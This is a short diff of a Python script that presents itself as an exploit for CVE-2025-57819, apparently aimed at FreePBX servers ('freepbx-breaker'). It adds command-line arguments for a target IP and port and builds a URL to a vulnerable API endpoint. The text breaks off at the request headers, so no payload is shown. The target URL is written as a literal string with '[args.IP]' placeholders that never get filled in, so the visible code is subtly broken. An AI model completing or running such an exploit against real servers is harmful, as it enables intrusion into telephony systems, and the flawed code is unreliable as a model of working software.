@@ -1,10 +1,18 @@
 #!/usr/bin/env python3
 
+import argparse
 import requests
 import json
 import sys
 
-TARGET_URL = "http://[SERVER_IP]:[PORT]/api/endpoint_vulnerable"
+parser = argparse.ArgumentParser(prog='freepbx-breaker',
+                    description='Exploit designed to exploit the vulnerability in CVE-2025-57819',
+                    epilog='UwU')
+parser.add_argument('IP')
+parser.add_argument('PORT')
+args = parser.parse_args()
+
+TARGET_URL = "http://[args.IP]:[args.PORT]/api/endpoint_vulnerable"
 TARGET_HEADERS = {
     "Content-Type": "application/json",
    
